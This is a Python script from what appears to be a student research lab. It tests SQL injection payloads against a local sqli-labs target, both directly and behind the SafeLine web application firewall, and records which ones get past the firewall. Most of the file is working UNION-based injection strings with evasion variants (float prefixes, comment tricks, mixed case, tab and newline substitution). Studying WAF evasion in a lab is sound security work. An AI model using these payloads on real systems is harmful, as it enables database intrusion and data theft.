"""
bypass_lab/verify_bypass.py
============================
Verifikasi final bypass Safeline.

Pattern: .1-- -'/0 UNION ALL SELECT 1,<num1>,<num2>'
- WAF pass: Safeline tidak blok
- Data return: <num1> muncul di response sebagai "Your Login name: <num1>"

Ini genuine bypass + data exfiltration (numeric marker).

Run:
    python3 -m bypass_lab.verify_bypass
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"


def check_numeric_bypass(payload, marker):
    """Return (plain_ok, waf_ok, plain_val, waf_val)."""
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    def extract_login(text):
        idx = text.find("Your Login name:")
        if idx < 0:
            return ""
        return text[idx+16:idx+60].split("<")[0].strip()

    pv = extract_login(rp.text)
    wv = extract_login(rw.text)
    return (
        str(marker) in pv,
        str(marker) in wv and rw.status_code != 403,
        pv,
        wv,
        rw.status_code,
    )


print("=" * 65)
print(" VERIFIKASI FINAL: Safeline numeric bypass")
print("=" * 65)

# Test berbagai kombinasi angka dan variasi payload
tests = [
    # (label, payload, marker_to_check)
    ("original +quote  1,99999,88888",
     ".1-- -'/0 UNION ALL SELECT 1,99999,88888'", 99999),

    ("float prefix .2",
     ".2-- -'/0 UNION ALL SELECT 1,99999,88888'", 99999),

    ("float prefix .5",
     ".5-- -'/0 UNION ALL SELECT 1,99999,88888'", 99999),

    ("no /0 +-- -",
     ".1-- -' UNION ALL SELECT 1,99999,88888-- -", 99999),

    ("with /NULL",
     ".1-- -'/NULL UNION ALL SELECT 1,99999,88888'", 99999),

    ("UNION ALL  vs UNION",
     ".1-- -'/0 UNION SELECT 1,99999,88888'", 99999),

    ("case uNiOn",
     ".1-- -'/0 uNiOn aLl sElEcT 1,99999,88888'", 99999),

    ("larger numbers",
     ".1-- -'/0 UNION ALL SELECT 1,13371337,31337000'", 13371337),

    ("with whitespace variants",
     ".1-- -'/0\tUNION\tALL\tSELECT\t1,99999,88888'", 99999),

    ("with newline",
     ".1-- -'/0\nUNION\nALL\nSELECT\n1,99999,88888'", 99999),
]

print(f"\n  {'Label':<45} {'Plain':>6} {'WAF':>6}  Plain_val → WAF_val")
print("  " + "-" * 80)

bypasses = []
for label, payload, marker in tests:
    p_ok, w_ok, pv, wv, status = check_numeric_bypass(payload, marker)
    p_tag = "OK" if p_ok else "FAIL"
    w_tag = "BYPASS" if w_ok else f"BLK({status})"
    print(f"  {label:<45} {p_tag:>6} {w_tag:>8}  {repr(pv[:20])} → {repr(wv[:20])}")
    if w_ok:
        bypasses.append((label, payload))
    time.sleep(0.3)

print(f"\n{'='*65}")
print(f" CONFIRMED BYPASSES: {len(bypasses)}")
for label, p in bypasses:
    print(f"  ✓ {label}")
    print(f"    {p}")
